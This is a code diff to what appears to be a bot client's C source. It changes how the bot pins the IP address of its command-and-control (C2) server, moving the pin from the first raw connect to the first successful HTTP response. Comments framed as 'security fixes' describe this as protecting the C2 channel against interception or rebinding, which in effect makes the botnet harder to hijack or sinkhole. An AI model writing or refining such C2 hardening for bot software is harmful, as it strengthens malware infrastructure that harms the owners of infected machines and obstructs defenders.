@@ -401,14 +401,12 @@ int http_connect(notnet_bot_t *bot) {
     
     bot->c2_http.sock = sock;
     bot->c2_http.connected = 1;
-    /* SECURITY FIX (#10): Pin IP on first successful HTTP connection */
-    if (!bot->c2_http.dns_pinned) {
-        struct sockaddr_in sin;
-        socklen_t slen = sizeof(sin);
-        getpeername(sock, (struct sockaddr *)&sin, &slen);
-        bot->c2_http.pinned_addr = sin.sin_addr;
-        bot->c2_http.dns_pinned = 1;
-    }
+    /* SECURITY FIX (#45): Do NOT pin the peer IP here on the raw connect.
+     * The first (unauthenticated) connection must not become the trusted
+     * pin — an on-path attacker who intercepts the first DNS resolution
+     * could pin their own IP, permanently defeating the rebinding
+     * protection. Pinning happens in http_read() only after a successful
+     * command/response round-trip proves the peer is the real C2. */
     log_info("HTTP: connected to %s:%d", bot->c2_http.server, bot->c2_http.port);
     return 0;
 }
@@ -532,6 +530,24 @@ int http_read(notnet_bot_t *bot, char *buf, int len) {
     log_info("HTTP: received %d bytes: %.200s", received, buf);
     if (received >= len) received = len - 1;
     buf[received] = '\0';
+
+    /* SECURITY FIX (#45): Pin the peer IP on the first *successful*
+     * exchange instead of on the raw connect. Receiving a valid HTTP
+     * response here proves the peer answered our request — the earliest
+     * point at which we have evidence this is the real C2. Subsequent
+     * connects are still checked against the pin in http_connect(). */
+    if (received > 0) {
+        struct sockaddr_in sin;
+        socklen_t slen = sizeof(sin);
+        if (getpeername(bot->c2_http.sock, (struct sockaddr *)&sin, &slen) == 0) {
+            if (!bot->c2_http.dns_pinned) {
+                bot->c2_http.pinned_addr = sin.sin_addr;
+                bot->c2_http.dns_pinned = 1;
+                log_info("HTTP: DNS pin set to %s after first response",
+                         inet_ntoa(sin.sin_addr));
+            }
+        }
+    }
     return received;
 }
 
